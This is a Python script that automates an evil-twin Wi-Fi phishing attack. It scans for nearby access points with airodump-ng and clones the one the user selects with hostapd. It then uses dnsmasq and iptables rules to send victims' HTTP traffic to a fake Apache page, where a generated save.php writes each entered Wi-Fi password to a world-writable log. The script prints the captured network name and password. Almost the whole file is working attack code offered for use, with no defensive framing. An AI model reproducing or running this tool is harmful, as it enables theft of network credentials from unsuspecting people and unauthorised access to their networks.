import subprocess
import csv
from threading import Timer
from os import system
import time
from os import path

# Automatically remove files that may have been created in previous runs of the script.
subprocess.call(['rm', 'output-01.csv'])
# Put the network adapter into monitor mode.
subprocess.call(['airmon-ng', 'start', 'wlan0'])
# Run airodump and write the results to output-01.csv.
p = subprocess.Popen(["airodump-ng", "wlan0mon", "-w", "output", "--output-format", "csv"])
# Allow airodump to continue for 10 seconds, then stop it
time.sleep(10)
p.terminate()

# Prompt user to select an access point to impersonate.
macAddr = ''
channel = ''
name = ' ' + input("Type in Access Point name: ")

# Parse airodump results for the access point name entered.
# Store the AP's mac address and channel number.
with open('output-01.csv', newline='') as f:
    for row in f:
        line = row.split(',')
        if (name in line):
            macAddr = line[0]
            channel = line[3].replace(" ", "")

# Remove old hostapd config file if it already exists.
subprocess.call(['rm', 'hostapd.conf'])

# Write a new hostapd config file modeled after the selected AP.
with open('hostapd.conf', 'w') as f:
    f.write('interface=wlan0mon\n')
    f.write('driver=nl80211\n')
    f.write('ssid=' + name[1:] + '\n')
    f.write('hw_mode=g\n')
    f.write('channel=' + channel + '\n')

# Parse localhost IP address for use when rerouting to our fake webpage.
process1 = subprocess.Popen(['ifconfig', 'eth0'], stdout=subprocess.PIPE)
process2 = subprocess.Popen(['grep', 'inet '], stdin=process1.stdout, stdout=subprocess.PIPE)
process3 = subprocess.Popen(['awk', '-F[: ]+', '{ print $3 }'], stdin=process2.stdout, stdout=subprocess.PIPE)
# IP address in string format.
ipAddr = process3.stdout.read().decode('utf-8')[:-1]

# Configure iptables to reroute HTTP traffic to our phishing page.
subprocess.call(['ifconfig', 'wlan0mon', 'up', '192.168.1.1', 'netmask', '255.255.255.0'])
subprocess.call(['route', 'add', '-net', '192.168.1.0', 'netmask', '255.255.255.0', 'gw', '192.168.1.1'])
subprocess.call(['iptables', '--table', 'nat', '--append', 'POSTROUTING', '--out-interface', 'eth0', '-j', 'MASQUERADE'])
subprocess.call(['iptables', '--append', 'FORWARD', '--in-interface', 'wlan0mon', '-j', 'ACCEPT'])
subprocess.call(['echo', '1', '>', '/proc/sys/net/ipv4/ip_forward'])
subprocess.call(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', ipAddr + ':80'])
subprocess.call(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-j', 'MASQUERADE'])

# Begin hosting with hostapd
proc1 = subprocess.Popen(['hostapd', 'hostapd.conf'])

# Remove dnsmasq config file if it already exists.
subprocess.call(['rm', 'dnsmasq.conf'])

# Write the dnsmasq config file
with open('dnsmasq.conf', 'w') as f:
    f.write('interface=wlan0mon\n')
    f.write('dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n')
    f.write('dhcp-option=3,192.168.1.1\n')
    f.write('dhcp-option=6,192.168.1.1\n')
    f.write('server=8.8.8.8\n')
    f.write('log-queries\n')
    f.write('log-dhcp\n')
    f.write('listen-address=127.0.0.1\n')

# Start up dnsmasq using the config file created
proc2 = subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf', '-d'])

# Move fake website into the directory that Apache hosts
subprocess.call(['cp', './website/index.html', '/var/www/html/'])
subprocess.call(['cp', './website/save.php', '/var/www/html/'])
subprocess.call(['cp', '-r','./website/images', '/var/www/html/'])
subprocess.call(['cp', '-r','./website/include', '/var/www/html/'])
subprocess.call(['cp', './website/log.txt', '/var/www/html/'])
# Give write access to the log.txt file
subprocess.call(['chmod', '777', '/var/www/html/log.txt'])

# Start the Apache sever to run fake website
subprocess.call(['/etc/init.d/apache2', 'start'])

# Create the php file used to steal credentials.
# Format in log.txt is [network name]:[password]
subprocess.call(['rm', './website/save.php'])
with open('./website/save.php', 'w') as f:
    f.write('<?php\n')
    f.write('session_start();\n')
    f.write('ob_start();\n')
    f.write('$key1=$_POST[\'key1\'];\n')
    f.write('$file = fopen(\'log.txt\', \'a\');\n')
    f.write('fwrite($file, \'\' . \'' + name[1:] +  '\' . \':\' . $key1 . PHP_EOL);\n')
    f.write('fclose($file);\n')
    f.write('echo \"Success!\";\n')
    f.write('sleep(6);\n')
    f.write('ob_end_flush();\n')
    f.write('?>\n')

# Sleep until log.txt is written to
while (path.getsize('/var/www/html/log.txt') == 0):
   time.sleep(3)

# Allow processes to complete before killing them
time.sleep(5)

# Kill hostapd and dnsmasq background processes
proc1.kill()
proc2.kill()

# Open log file for reading
f = open('/var/www/html/log.txt', 'r')
# Get first line. Remove possible newlines from end
line = f.readline().strip('\n')

# credentials[0] contains the essid
# credentials[1] contains the password
credentials = line.split(':')
print(credentials[0])
print(credentials[1])

